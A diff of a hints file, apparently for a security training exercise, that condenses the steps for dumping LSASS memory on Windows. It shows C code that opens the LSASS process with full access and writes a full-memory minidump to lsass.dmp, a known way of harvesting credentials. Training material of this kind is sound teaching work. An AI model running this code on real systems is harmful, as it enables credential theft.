@@ -1,17 +1,13 @@
-=== HINT 1: Enable SeDebugPrivilege ===
-// enable_debug_privilege() helper already in the exercise
-
-=== HINT 2: Find LSASS PID ===
-DWORD lsass_pid = find_lsass_pid();  // helper already provided
-
-=== HINT 3: Open LSASS ===
+=== HINT 1: Privilege + PID + process handle ===
+// enable_debug_privilege() and find_lsass_pid() helpers are already in the exercise
+DWORD lsass_pid = find_lsass_pid();
 HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
 
-=== HINT 4: Create dump file ===
+=== HINT 2: Create dump file ===
 HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL,
     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-=== HINT 5: Write dump ===
+=== HINT 3: Write dump ===
 BOOL ok = MiniDumpWriteDump(hProc, lsass_pid, hFile,
     MiniDumpWithFullMemory, NULL, NULL, NULL);
 
